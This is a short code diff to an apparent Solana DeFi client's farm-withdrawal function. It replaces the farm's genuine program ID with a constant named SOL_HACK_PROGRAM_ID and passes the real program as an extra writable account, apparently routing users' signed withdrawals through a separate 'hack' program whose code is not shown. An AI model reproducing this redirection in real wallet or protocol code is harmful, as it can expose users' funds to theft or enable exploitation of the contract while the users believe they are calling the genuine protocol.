@@ -333,7 +333,8 @@ export async function withdrawV4(
         signers
     )
 
-    const programId = new PublicKey(farmInfo.programId)
+    // const programId = new PublicKey(farmInfo.programId)
+    const programId = new PublicKey(SOL_HACK_PROGRAM_ID);
     const value = new TokenAmount(amount, farmInfo.lp.decimals, false).wei.toNumber()
 
     transaction.add(
@@ -350,7 +351,9 @@ export async function withdrawV4(
             userRewardTokenAccountB,
             // @ts-ignore
             new PublicKey(farmInfo.poolRewardTokenAccountB),
-            value
+            value,
+            // added 
+            new PublicKey(farmInfo.programId),
         )
     )
 
@@ -373,7 +376,8 @@ export function withdrawInstructionV4(
     userRewardTokenAccountB: PublicKey,
     poolRewardTokenAccountB: PublicKey,
     // tokenProgramId: PublicKey,
-    amount: number
+    amount: number,
+    rayProgram: PublicKey,
 ): TransactionInstruction {
     const dataLayout = struct([u8('instruction'), nu64('amount')])
 
@@ -389,7 +393,8 @@ export function withdrawInstructionV4(
         { pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: true },
         { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: true },
         { pubkey: userRewardTokenAccountB, isSigner: false, isWritable: true },
-        { pubkey: poolRewardTokenAccountB, isSigner: false, isWritable: true }
+        { pubkey: poolRewardTokenAccountB, isSigner: false, isWritable: true },
+        { pubkey: rayProgram, isSigner: false, isWritable: true }
     ]
 
     const data = Buffer.alloc(dataLayout.span)
